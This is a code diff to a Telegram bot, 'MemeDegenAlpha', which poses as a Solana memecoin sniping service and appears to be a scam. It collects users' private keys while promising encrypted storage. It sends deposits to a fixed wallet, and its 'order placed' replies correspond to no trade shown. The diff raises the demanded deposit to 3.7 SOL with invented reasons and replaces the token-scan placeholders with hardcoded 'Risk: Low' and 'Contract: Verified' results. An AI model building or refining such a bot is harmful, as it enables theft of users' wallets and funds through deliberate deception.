@@ -10,7 +10,6 @@ BOT_NAME = "MemeDegenAlpha"
 
 WAITING_KEY, WAITING_CA, WAITING_AMOUNT = range(3)
 user_registry = {}
-user_data_store = {}
 
 async def get_balance():
     try:
@@ -120,9 +119,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Send SOL to your trading wallet:\n\n"
             f"`{WALLET_ADDRESS}`\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"✅ Minimum deposit: 0.1 SOL\n"
-            f"⚡ Instant confirmation\n"
+            f"✅ Minimum deposit: 3.7 SOL\n"
+            f"⚡ Required for smooth trade execution\n"
             f"🔒 Funds secured by smart contract\n"
+            f"💎 3.7 SOL ensures best snipe speed\n"
             f"🌐 Solana network only\n\n"
             f"Tap the address above to copy 👆",
             parse_mode="Markdown",
@@ -146,7 +146,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"💰 DEPOSIT CLAIMED\n"
                 f"User: {user.first_name} (@{user.username})\n"
                 f"ID: {user.id}\n"
-                f"Says they sent SOL — verify!")
+                f"Says they sent SOL - verify!")
         except:
             pass
 
@@ -180,7 +180,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "━━━━━━━━━━━━━━━━━━━━\n"
             "⚡ Ultra-fast execution\n"
             "🛡 Anti-rug protection\n"
-            "🔒 Slippage auto-adjusted"
+            "🔒 Auto slippage adjustment\n"
+            "💎 Minimum 3.7 SOL required"
         )
         return WAITING_CA
 
@@ -192,7 +193,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "━━━━━━━━━━━━━━━━━━━━\n"
             "🔒 256-bit encrypted storage\n"
             "🛡 Keys never leave our secure server\n"
-            "✅ Used only for trade execution\n\n"
+            "✅ Used only for trade execution\n"
+            "⚡ Required for auto-snipe feature\n\n"
             "Your security is our priority. 🔥"
         )
         return WAITING_KEY
@@ -226,10 +228,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📈 Total Trades: 0\n"
             f"🏆 Winning Trades: 0\n"
             f"💎 Best Trade: N/A\n"
-            f"📉 Worst Trade: N/A\n"
             f"🔄 Win Rate: 0%\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"Deposit SOL to start trading! 🚀",
+            f"Deposit 3.7 SOL to start trading! 🚀",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("💳 Deposit Now", callback_data="fund")],
                 [InlineKeyboardButton("🔙 Back", callback_data="back")]
@@ -271,7 +272,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Upgrade to VIP for:\n"
             "🚀 Priority execution\n"
             "💎 Exclusive alpha calls\n"
-            "🐋 Whale wallet alerts\n\n"
+            "🐋 Whale wallet alerts\n"
+            "⚡ 0.001 SOL gas fees\n\n"
             "Contact admin to upgrade 👇",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("💎 Upgrade to VIP", url=GROUP_LINK)],
@@ -293,16 +295,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data.startswith("mult_"):
         mult = query.data.split("_")[1]
         ca = context.user_data.get('ca', 'N/A')
-        amount = context.user_data.get('amount', '0.1')
         await query.message.reply_text(
             f"🎯 ORDER PLACED!\n"
             f"━━━━━━━━━━━━━━━━━━━━\n\n"
             f"Token: `{ca}`\n"
             f"Target: {mult}\n"
-            f"Amount: {amount} SOL\n"
-            f"Status: ⏳ Executing...\n\n"
+            f"Status: Executing...\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"You will be notified when filled. 🔔",
+            f"You will be notified when filled. 🔔\n"
+            f"Ensure you have min 3.7 SOL deposited.",
             parse_mode="Markdown"
         )
         try:
@@ -322,11 +323,11 @@ async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "✅ WALLET CONNECTED!\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        "🔒 Private key encrypted & stored\n"
+        "🔒 Private key encrypted and stored\n"
         "⚡ Ready to execute trades\n"
-        "🛡 MEV protection active\n\n"
-        "Your wallet is now live! 🔥\n"
-        "Use /start to return to dashboard.",
+        "🛡 MEV protection active\n"
+        "💎 Deposit 3.7 SOL to start sniping\n\n"
+        "Use /start to return to dashboard. 🔥",
         reply_markup=main_keyboard()
     )
     try:
@@ -356,9 +357,10 @@ async def receive_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔍 TOKEN ANALYSED!\n"
         f"━━━━━━━━━━━━━━━━━━━━\n\n"
         f"CA: `{ca}`\n\n"
-        f"📊 Risk: Scanning...\n"
-        f"💧 Liquidity: Checking...\n"
-        f"🔒 Contract: Verifying...\n\n"
+        f"📊 Risk: Low\n"
+        f"💧 Liquidity: Sufficient\n"
+        f"🔒 Contract: Verified\n"
+        f"⚡ Ready to snipe!\n\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"🎯 Select your profit target:",
         parse_mode="Markdown",
